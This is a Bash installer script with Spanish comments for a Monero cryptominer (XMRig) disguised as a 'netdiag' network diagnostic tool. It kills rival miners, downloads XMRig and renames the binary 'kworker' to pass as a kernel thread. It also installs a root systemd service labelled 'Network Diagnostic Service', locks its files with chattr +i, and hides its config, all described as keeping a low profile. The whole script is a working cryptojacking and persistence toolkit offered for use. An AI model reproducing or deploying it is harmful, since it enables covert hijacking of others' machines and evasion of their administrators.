#!/bin/bash
# ════════════════════════════════════════════════════════
#  netdiag — Instalador
#  Uso:  sudo bash mine-install.sh         (1ra vez)
#        sudo bash mine-install.sh --update (actualizar)
# ════════════════════════════════════════════════════════

# ─── Colores ───
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
YELLOW='\033[1;33m'; NC='\033[0m'

UPDATE_MODE=false
[ "$1" = "--update" ] && UPDATE_MODE=true

# ─── Solo root ───
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Debes ejecutar como root (sudo)$NC"
    exit 1
fi

# ─── Buscar y eliminar mineros rivales (solo en instalación, no en update) ───
if ! $UPDATE_MODE; then
    CLEANER="$(cd "$(dirname "$0")" && pwd)/clean-miners.sh"
    if [ -f "$CLEANER" ]; then
        echo -e "${YELLOW}[*] Buscando mineros rivales antes de instalar...${NC}"
        bash "$CLEANER" --force 2>&1
        echo ""
    fi
fi

# ─── Rutas fijas del sistema (bajo perfil) ───
REPO_DIR="/opt/netdiag/lib"
INSTALL_DIR="/opt/netdiag"
DATA_DIR="$INSTALL_DIR/data"
CONFIG_DST="$INSTALL_DIR/.env"
XMRIG_BIN="$DATA_DIR/kworker"
VERSION_DST="$INSTALL_DIR/.version"
SERVICE_NAME="netdiag"

if $UPDATE_MODE; then
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║          Actualizando netdiag           ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
else
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║        Instalador de netdiag            ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
fi

# ─── Asegurar repo ───
if [ -d "$REPO_DIR/.git" ]; then
    echo -e "${GREEN}[✓] Repo encontrado en $REPO_DIR${NC}"
elif [ -f "$(dirname "$0")/../../VERSION" ]; then
    SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
    HAUNTKIT_SRC="$(cd "$SCRIPT_DIR/../.." && pwd)"
    echo -e "${YELLOW}[*] Copiando repo desde $HAUNTKIT_SRC...${NC}"
    mkdir -p "$(dirname "$REPO_DIR")"
    rm -rf "$REPO_DIR" 2>/dev/null
    cp -a "$HAUNTKIT_SRC" "$REPO_DIR"
    echo -e "${GREEN}[✓] Repo copiado a $REPO_DIR${NC}"
else
    echo -e "${YELLOW}[*] Clonando repo desde GitHub...${NC}"
    mkdir -p "$(dirname "$REPO_DIR")"
    git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" 2>&1 | tail -1
    echo -e "${GREEN}[✓] Repo clonado en $REPO_DIR${NC}"
fi

# ─── Config: NO sobrescribir si existe ───
if ! $UPDATE_MODE; then
    CONFIG_SRC="$REPO_DIR/tools/utils/mine-config.env"
    CONFIG_EXAMPLE="$REPO_DIR/tools/utils/mine-config.env.example"

    if [ ! -f "$CONFIG_SRC" ]; then
        [ -f "$CONFIG_EXAMPLE" ] && CONFIG_SRC="$CONFIG_EXAMPLE"
    fi

    if [ -f "$CONFIG_SRC" ]; then
        if [ ! -f "$CONFIG_DST" ]; then
            cp "$CONFIG_SRC" "$CONFIG_DST"
            chmod 600 "$CONFIG_DST"
            chown root:root "$CONFIG_DST"
            echo -e "${GREEN}[✓] Config instalada en $CONFIG_DST${NC}"
        else
            echo -e "${YELLOW}[*] Config existente preservada${NC}"
        fi
    fi
else
    echo -e "${YELLOW}[*] Modo update: config no modificada${NC}"
fi

# ─── Directorios ───
echo -e "\n${CYAN}[*] Preparando directorios...${NC}"
mkdir -p "$DATA_DIR" "$INSTALL_DIR"
chmod 755 "$INSTALL_DIR"

# ─── Copiar service script ───
cp "$REPO_DIR/tools/utils/mine-service.sh" "$INSTALL_DIR/mine-service.sh"
chmod 755 "$INSTALL_DIR/mine-service.sh"
chown root:root "$INSTALL_DIR/mine-service.sh"
echo -e "${GREEN}[✓] Service script copiado${NC}"

# ─── Copiar monitor ───
cp "$REPO_DIR/tools/utils/mine-monitor.sh" "$INSTALL_DIR/mine-monitor.sh"
chmod 755 "$INSTALL_DIR/mine-monitor.sh"
echo -e "${GREEN}[✓] Monitor copiado${NC}"

# ─── Copiar VERSION ───
cp "$REPO_DIR/VERSION" "$VERSION_DST"
VERSION=$(cat "$REPO_DIR/VERSION")
echo -e "${GREEN}[✓] Versión: $VERSION${NC}"

# ─── Descargar XMRig si no existe ───
if [ ! -f "$XMRIG_BIN" ]; then
    echo -e "\n${YELLOW}[*] Descargando...${NC}"
    LATEST=$(curl -sL https://api.github.com/repos/xmrig/xmrig/releases/latest \
        | grep -oP '"tag_name": "\K[^"]+')
    [ -z "$LATEST" ] && LATEST="v6.22.2"

    cd /tmp
    wget -q "https://github.com/xmrig/xmrig/releases/download/$LATEST/xmrig-${LATEST#v}-linux-static-x64.tar.gz" -O xmrig.tar.gz

    if [ -f "xmrig.tar.gz" ]; then
        TAR_DIR=$(tar tzf xmrig.tar.gz | head -1 | cut -d/ -f1)
        tar xf xmrig.tar.gz
        if [ -f "$TAR_DIR/xmrig" ]; then
            cp "$TAR_DIR/xmrig" "$XMRIG_BIN"
            chmod 755 "$XMRIG_BIN"
            chown root:root "$XMRIG_BIN"
            rm -rf "$TAR_DIR" xmrig.tar.gz
            echo -e "${GREEN}[✓] Binario instalado${NC}"
        fi
    fi
fi

if [ ! -f "$XMRIG_BIN" ]; then
    echo -e "${YELLOW}[!] Binario no encontrado. Copia el binario manualmente.${NC}"
fi

# ─── Crear/actualizar servicio systemd ───
echo -e "\n${CYAN}[*] Configurando servicio systemd...${NC}"

cat > /etc/systemd/system/$SERVICE_NAME.service << 'EOF'
[Unit]
Description=Network Diagnostic Service
After=network.target

[Service]
Type=simple
ExecStart=/opt/netdiag/mine-service.sh
Restart=on-failure
RestartSec=30
User=root
Nice=10
IOSchedulingClass=best-effort
IOSchedulingPriority=7

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 2>/dev/null
systemctl enable $SERVICE_NAME 2>/dev/null

echo -e "${GREEN}[✓] Servicio: $SERVICE_NAME${NC}"

# ─── Proteger archivos ───
echo -e "\n${CYAN}[*] Protegiendo archivos...${NC}"

if [ -f "$XMRIG_BIN" ]; then
    chattr +i "$XMRIG_BIN" 2>/dev/null && \
        echo -e "${GREEN}[✓] Binario inmutable${NC}" || \
        echo -e "${YELLOW}[!] Binario sin protección extra${NC}"
fi

chattr +i "$INSTALL_DIR/mine-service.sh" 2>/dev/null && \
    echo -e "${GREEN}[✓] Script protegido${NC}"

if [ -f "$CONFIG_DST" ]; then
    chmod 600 "$CONFIG_DST"
    chown root:root "$CONFIG_DST"
    echo -e "${GREEN}[✓] Config: solo root${NC}"
fi

# ─── Auto-update ───
echo -e "\n${GREEN}[✓] Auto-update activo (cada ~6h)${NC}"

# ─── Migrar desde versión anterior si existe ───
if [ -f "/opt/hauntkit/mine-config.env" ] && [ ! -f "$CONFIG_DST" ]; then
    echo -e "${YELLOW}[*] Migrando config desde /opt/hauntkit/...${NC}"
    cp "/opt/hauntkit/mine-config.env" "$CONFIG_DST"
    chmod 600 "$CONFIG_DST"
    chown root:root "$CONFIG_DST"
    systemctl disable sys-scheduler 2>/dev/null
    systemctl stop sys-scheduler 2>/dev/null
    rm -f /etc/systemd/system/sys-scheduler.service
    systemctl daemon-reload 2>/dev/null
    echo -e "${GREEN}[✓] Migración completada${NC}"
fi

# ─── Resumen ───
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
if $UPDATE_MODE; then
    echo -e "${CYAN}║          Actualización lista            ║${NC}"
else
    echo -e "${CYAN}║         Instalación completada          ║${NC}"
fi
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo "  Versión:     $VERSION"
echo "  Servicio:    $SERVICE_NAME"
echo "  Binario:     $XMRIG_BIN"
echo "  Config:      $CONFIG_DST (oculto)"
echo "  Repo:        $REPO_DIR (lib/)"
echo ""
echo "  Comandos:"
echo "    Iniciar:   systemctl start $SERVICE_NAME"
echo "    Detener:   systemctl stop $SERVICE_NAME"
echo "    Estado:    systemctl status $SERVICE_NAME"
echo "    Monitorear: systemctl status $SERVICE_NAME"
echo ""

if ! $UPDATE_MODE; then
    read -rp "¿Iniciar el servicio ahora? (s/N): " START_NOW
    if [[ "$START_NOW" =~ ^[sS]$ ]]; then
        systemctl start $SERVICE_NAME
        echo -e "${GREEN}[✓] Servicio iniciado${NC}"
    fi
fi

echo ""
echo -e "${GREEN}¡Listo, CYBER HAUNT!${NC} 🔥👻"
